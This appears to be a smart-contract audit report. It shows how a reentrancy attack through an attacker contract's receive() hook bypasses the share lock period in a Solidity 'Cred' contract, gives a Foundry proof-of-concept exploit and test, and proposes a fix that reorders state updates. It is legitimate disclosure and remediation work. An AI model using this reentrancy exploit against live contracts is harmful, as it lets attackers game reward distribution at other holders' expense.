# Vulnerability details

## Impact
In previous audit report there is an issue "[H-1] Reward distribution is vulnerable to flash loan attacks". This was possible when attacker buyShares->claimRewards->sellShares in one transaction. It was fixed by adding some cooldown after buying shares - `SHARE_LOCK_PERIOD`. However, introduced fix does not fully prevents from this happening. There is still possibility to do this with reentrancy attack.

## Proof of Concept
Add this contract to `Cred.t.sol`
```solidity
contract ReentrancyBypass {
    Cred cred;
    uint256 credId;
    uint256 amount;
    uint256 minPrice;

    constructor(Cred _cred, uint256 _credId, uint256 _amount, uint256 _minPrice){
        cred = _cred;
        credId = _credId;
        amount = _amount;
        minPrice = _minPrice;
    }

    receive() external payable{
        if(cred.isShareHolder(1, address(this))){
            cred.sellShareCred(credId, amount, minPrice);
        }
    }
}
```
and this test
```solidity
    function test_bypassShareLockPeriod() public {
        _createCred("BASIC", "SIGNATURE", 0x0);
        uint256 buyPrice = bondingCurve.getBuyPriceAfterFee(1, 1, 1);

        ReentrancyBypass reentrancyBypass = new ReentrancyBypass(cred, 1, 1, 0);
        address attackerAddress = address(reentrancyBypass);

        vm.deal(attackerAddress, 1 ether);

        vm.startPrank(attackerAddress);
        cred.buyShareCred{ value: buyPrice + 1 }(1, 1, 0); //send more than buyPrice to trigger receive() function

        assertEq(cred.isShareHolder(1, attackerAddress), false); // if this passes means attacker successfully sold shares and bypassed share lock period
        vm.stopPrank();
    }
```
And run command `forge test --mt test_bypassShareLockPeriod`
The test will pass. It means attacker successfully sold shares in the same transaction and bypassed `SHARE_LOCK_PERIOD` value.

## Recommended Mitigation Steps
Follow CEI best practice in `Cred::_handleTrade`
```diff
    function _handleTrade(
        uint256 credId_,
        uint256 amount_,
        bool isBuy,
        address curator_,
        uint256 priceLimit
    )
        internal
        whenNotPaused
    {
        if (amount_ == 0) {
            revert InvalidAmount();
        }

        if (!isExist(credId_)) {
            revert InvalidCredId();
        }

        PhiCred storage cred = creds[credId_];

        uint256 supply = cred.currentSupply;
        address creator = cred.creator;

        (uint256 price, uint256 protocolFee, uint256 creatorFee) =
            IBondingCurve(cred.bondingCurve).getPriceData(credId_, supply, amount_, isBuy); //suply is 0 when creating, what is the price?

        if (isBuy) {
            if (priceLimit != 0 && price + protocolFee + creatorFee > priceLimit) revert PriceExceedsLimit();
            if (supply + amount_ > MAX_SUPPLY) {
                revert MaxSupplyReached();
            }

            if (msg.value < price + protocolFee + creatorFee) {
                revert InsufficientPayment();
            }
        } else {
            if (priceLimit != 0 && price - protocolFee - creatorFee < priceLimit) revert PriceBelowLimit(); 
            if (block.timestamp <= lastTradeTimestamp[credId_][curator_] + SHARE_LOCK_PERIOD) {
                revert ShareLockPeriodNotPassed(
                    block.timestamp, lastTradeTimestamp[credId_][curator_] + SHARE_LOCK_PERIOD
                );
            }
            (, uint256 nums) = shareBalance[credId_].tryGet(curator_);
            if (nums < amount_) {
                revert InsufficientShares();
            }
        }

        _updateCuratorShareBalance(credId_, curator_, amount_, isBuy);

        if (isBuy) {
            cred.currentSupply += amount_;
            uint256 excessPayment = msg.value - price - protocolFee - creatorFee;
    +       lastTradeTimestamp[credId_][curator_] = block.timestamp;
            if (excessPayment > 0) {
                _msgSender().safeTransferETH(excessPayment);
            }
    -       lastTradeTimestamp[credId_][curator_] = block.timestamp;
        } else {
            cred.currentSupply -= amount_;
            curator_.safeTransferETH(price - protocolFee - creatorFee);
        }

        protocolFeeDestination.safeTransferETH(protocolFee);
        IPhiRewards(phiRewardsAddress).deposit{ value: creatorFee }(
            creator, bytes4(keccak256("CREATOR_ROYALTY_FEE")), ""
        );
        emit Royalty(creator, credId_, creatorFee);

        cred.latestActiveTimestamp = block.timestamp;

        emit Trade(curator_, credId_, isBuy, amount_, price, protocolFee, cred.currentSupply);
    }
```
